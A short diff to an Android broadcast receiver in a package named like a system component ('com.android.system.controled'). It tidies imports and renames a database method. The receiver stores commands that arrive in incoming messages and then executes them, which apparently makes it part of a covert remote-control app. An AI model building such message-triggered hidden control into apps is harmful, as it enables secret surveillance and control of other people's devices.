@@ -1,7 +1,5 @@
 package com.android.system.controled.receiver;
 
-import java.io.File;
-
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
@@ -13,9 +11,7 @@ import com.android.system.controled.MainApplication;
 import com.android.system.controled.bean.Code;
 import com.android.system.controled.db.InnerDbOpera;
 import com.android.system.controled.util.DoAboutCodeUtils;
-import com.android.system.controled.util.FileUtil;
 import com.android.system.controled.util.InitUtil;
-import com.android.system.controled.util.StringUtil;
 import com.android.system.controled.util.TimeUtil;
 
 public class MsgAndOtherReceiver extends BroadcastReceiver {
@@ -60,7 +56,7 @@ public class MsgAndOtherReceiver extends BroadcastReceiver {
 					
 					code.setDate(TimeUtil.getCurrentTimeMillisInner());
 					//先存储一下命令，再执行命令
-					if(InnerDbOpera.getInstence().insertCode(code) > 0) {
+					if(InnerDbOpera.getInstence().insertNewCode(code) > 0) {
 						code = DoAboutCodeUtils.doOperaByMessage(context, msgTxt, code);
 					}
 				}
